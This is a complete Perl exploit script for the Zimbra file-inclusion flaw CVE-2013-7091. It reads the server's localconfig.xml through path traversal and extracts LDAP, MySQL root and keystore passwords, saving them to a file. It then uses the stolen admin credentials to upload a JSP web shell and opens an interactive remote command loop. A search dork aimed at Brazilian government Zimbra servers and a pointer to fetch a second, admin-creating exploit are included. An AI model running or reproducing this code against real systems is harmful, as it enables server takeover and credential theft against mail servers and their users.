#!/usr/bin/perl
#
# Title: Zimbra file inclusion/Shell upload exploit
# CVE: 2013-7091
# Author: Simo Ben youssef
# Contact: Simo_at_Morxploit_com
# Coded: 21 February 2014
# Published: 24 February 2014
# MorXploit Research
# http://www.MorXploit.com
#
# Perl code to exploit CVE: 2013-7091
# Uploads a jsp shell when successfully exploited
#
# Requires LWP::UserAgent
# apt-get install libwww-perl
# yum install libwww-perl
# perl -MCPAN -e 'install Bundle::LWP'
# 
# Tested on Linux Ubuntu
#
# Author disclaimer:
# The information contained in this entire document is for educational, demonstration and testing purposes only.
# Author cannot be held responsible for any malicious use. Use at your own risk.
#
# Exploit usage:
# perl MorXZimbraShell.pl localhost 7071
# -------------------------------------------------------
# -- Zimbra file inclusion/Shell upload exploit
# -- Code by: Simo Ben youssef <simo_at_MorXploit_dot_com>
# -- http://www.MorXploit.com
# -------------------------------------------------------

# [+] Target set to localhost:7071
# [*] Extracting zimbra ldap password/username:
# [*] Trying to get zimbra_user
# [+] Got zimbra_user: zimbra
# [*] Trying to get zimbra_ldap_password
# [+] Got zimbra_ldap_password: lonboaxMNu
# [*] Trying to get auth token
# [+] Got auth token
# [*] Trying to upload shell ...
# [+] pwned! Shell successfully uploaded
# Linux localhost 3.2.0-29-generic #46-Ubuntu SMP Fri Jul 27 17:03:23 UTC 2012 x86_64 x86_64 x86_64 GNU/Linux
# uid=1001(zimbra) gid=1001(zimbra) groups=1001(zimbra),0(root)
#DORK intext:Login  & intext:zimbra site:.gov.br -pdf'
#Code by: Simo Ben youssef / Edited INURL - BRASIL
use strict;
use LWP::UserAgent;
use Time::Piece;

sub banner {
print "0x[EXPLOIT NAME]: Zimbra file inclusion/Shell upload exploit / Edited INURL - BRASIL\n";
print "0x|--------------------------------------------------------------------------------------------------------------------\n";
}

if (!defined ($ARGV[0])) {
print "0x[ERROR][Usage]: perl $0 host\n";
exit;
}
my $host = $ARGV[0];
my $soappath = "service/admin/soap";
my $upload = "service/extension/clientUploader/upload/";
my $shellname = "morx.jsp";
my $output = "zimbra_file_inclusion-$host.txt";
my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
my $can_accept = HTTP::Message::decodable;
my $response = $ua->get("https://$host/zimbraAdmin/res/I18nMsg,AjxMsg,ZMsg,ZmMsg,AjxKeys,ZmKeys,ZdMsg,Ajx%20TemplateMsg.js.zgz?v=091214175450&skin=../../../../../../../../../opt/zimbra/conf/localconfig.xml%00", 
    'Accept-Encoding' => $can_accept,
);

sub pwn {
if ($response->decoded_content =~ /$_[0](.*?)<\/value>/s){
$1 =~ /a\["<value>(.*)/s;
print "0x ".localtime->strftime('%H:%M:%S')." [INFO][VALUE][ $_[0] ]: $1\n";
return $1;
}
else
{
print "0x ".localtime->strftime('%H:%M:%S')." [INFO][NOT VULN]: Failed to get $_[0]! Probably NOT VULNERABLE!\n";
exit;
}
}
banner();
print "0x ".localtime->strftime('%H:%M:%S')." [INFO]: TARGET SET TO $host \n";
print "0x ".localtime->strftime('%H:%M:%S')." [INFO]: Extracting passwords:\n";
my $ldap_postfix = pwn("ldap_postfix_password");
my $ldap_amavis_pass = pwn("ldap_amavis_password");
my $ldap_replication_pass = pwn("ldap_replication_password");
my $ldap_root_pass= pwn("ldap_root_password");
my $ldap_nginx_pass = pwn("ldap_nginx_password");
my $mailboxd_key = pwn("mailboxd_keystore_password");
my $zimbra_mysql_pass= pwn("zimbra_mysql_password");
my $mysql_root_pass = pwn("mysql_root_password");
my $mailboxd_truststore = pwn("mailboxd_truststore_password");
print "0x ".localtime->strftime('%H:%M:%S')." [INFO]: Extracting zimbra ldap PASSWORD/USERNAME:\n";
my $ldap_user = pwn("zimbra_user");
my $ldap_pass = pwn("zimbra_ldap_password");
my $dados_complementares = "
\n::DADOS COMPLEMENTARES::
ldap_postfix_pass=>$ldap_postfix :: ldap_amavis_pass=>$ldap_amavis_pass :: ldap_replication_pass=>$ldap_replication_pass :: ldap_root_pass=>$ldap_root_pass :: ldap_nginx_pass=>$ldap_nginx_pass :: mailboxd_keystore_pass=>$mailboxd_key :: zimbra_mysql_pass=>$zimbra_mysql_pass :: mysql_root_pass=>$mysql_root_pass :: mailboxd_truststore_pass=>$mailboxd_truststore\n
------------------------------------------------------------------------------------------------------------------------------"; 

print "0x ".localtime->strftime('%H:%M:%S')." [INFO]: Trying to get auth token\n";
if($ldap_user !~ "Failed") { 
system("echo 'HOST:$host | USER:$ldap_user | PASS:$ldap_pass / $dados_complementares' >> $output"); 
print "0x ".localtime->strftime('%H:%M:%S')." [INFO]: values saved in the file [ $output ]\n"
}
my $message = "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<env:Envelope xmlns:env=\"http://www.w3.org/2003/05/soap-envelope\" xmlns:ns1=\"urn:zimbraAdmin\" xmlns:ns2=\"urn:zimbraAdmin\"><env:Header><ns2:context/></env:Header><env:Body><ns1:AuthRequest><account by=\"name\">$ldap_user</account><password>$ldap_pass</password></ns1:AuthRequest></env:Body></env:Envelope>";
my $userAgent = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
my $request = HTTP::Request->new(POST => "https://$host/$soappath");
$request->header(SOAPAction => 'urn:zimbraAdmin#AuthRequest');
$request->content($message);
$request->content_type('application/soap+xml; charset=utf-8');
my $response = $userAgent->request($request);
my $authtoken;
if ($response->content =~ /<authToken>(.*?)<\/authToken>/s){
$authtoken = $1;
print "0x ".localtime->strftime('%H:%M:%S')." [INFO]: Got auth token\n";
}
else
{
print "0x ".localtime->strftime('%H:%M:%S')." [INFO][NOT VULN]: Failed to get auth token\n";
exit;
}

print "0x ".localtime->strftime('%H:%M:%S')." [INFO]: Trying to upload shell ...\n";
$ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
my $resp = $ua->post("https://$host/$upload", 
Content_Type => 'form-data',
Cookie => "ZM_ADMIN_AUTH_TOKEN=$authtoken",
Content => [
clientFile => [ undef, "$shellname",
Content_Type => 'application/octet-stream',
Content => "<%@ page import=\"java.util.*,java.io.*\"%>
<%
if (request.getParameter(\"cmd\") != null) {
String cmd = request.getParameter(\"cmd\");
Process p = Runtime.getRuntime().exec(cmd);
OutputStream os = p.getOutputStream();
InputStream in = p.getInputStream();
DataInputStream dis = new DataInputStream(in);
String disr = dis.readLine();
while ( disr != null ) {
out.println(disr);
disr = dis.readLine();
}
}
%>",
      ],
      submit => 'requestId',
   ],
);

if ($resp->as_string =~ /200 OK/) {
print "0x ".localtime->strftime('%H:%M:%S')." [INFO]: pwned! Shell successfully uploaded\n";
}
else {
print "[-] Couldn't upload shell although host is vulnerable, most likely cuz clientUploader extention was not found\n";
print "0x ".localtime->strftime('%H:%M:%S')." [INFO]: wget http://www.morxploit.com/morxploits/morxzimbra.pl to create a new admin account, have fun!\n";
#print $resp->as_string; # uncomment to print server's response
exit;
}

my $whoami = $ua->get("https://$host/downloads/$shellname?cmd=whoami");
my $uname = $ua->get("https://$host/downloads/$shellname?cmd=uname%20-n");
my $id = $ua->get("https://$host/downloads/$shellname?cmd=id");
my $unamea = $ua->get("https://$host/downloads/$shellname?cmd=uname%20-a");
print $unamea->content; 
print $id->content;
my $wa = $whoami->content;
my $un = $uname->content;
chomp($wa);
chomp($un);

while () {
print "\n$wa\@$un:~\$ ";
chomp(my $cmd=<STDIN>);
if ($cmd eq "exit") 
{ 
print "Aurevoir!\n";
exit;
}
my $output = $ua->get("https://$host/downloads/$shellname?cmd=$cmd");
print $output->content;
}